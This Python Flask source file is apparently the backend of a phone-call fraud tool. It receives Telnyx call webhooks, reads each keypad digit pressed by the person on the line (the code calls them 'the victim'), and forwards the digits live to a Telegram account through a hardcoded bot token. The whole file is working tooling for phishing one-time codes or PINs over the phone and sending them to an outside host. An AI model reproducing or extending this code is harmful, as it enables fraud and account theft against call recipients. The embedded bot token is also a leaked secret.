import os
import requests
from flask import Flask, request

app = Flask(__name__)

# Telegram Bot Token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    # Log the entire request body
    data = request.json
    print(f"Received JSON data: {data}")
    
    # Log all headers (optional, for debugging)
    print(f"Headers: {request.headers}")
    
    # Log query parameters (in case the telegram_user_id is passed in the URL)
    telegram_user_id = request.args.get('telegram_user_id', None)
    print(f"Telegram User ID: {telegram_user_id}")
    
    # Extract the digit pressed by the victim
    digit = data.get('digit', None)
    if digit:
        print(f"Digit Pressed: {digit}")
        # Send a direct message to the Telegram user
        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
    else:
        print("No digit pressed.")
    
    return 'OK', 200

def send_telegram_message(user_id, message):
    """Send a message to the Telegram user."""
    if not user_id:
        print("Error: Telegram user ID is missing.")
        return
    
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {'chat_id': user_id, 'text': message}
    response = requests.get(url, params=params)
    
    # Print the status code and response for debugging
    print(f"Sent message to Telegram user {user_id}: {message}, Response: {response.status_code}")
    if response.status_code != 200:
        print(f"Failed to send message: {response.text}")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
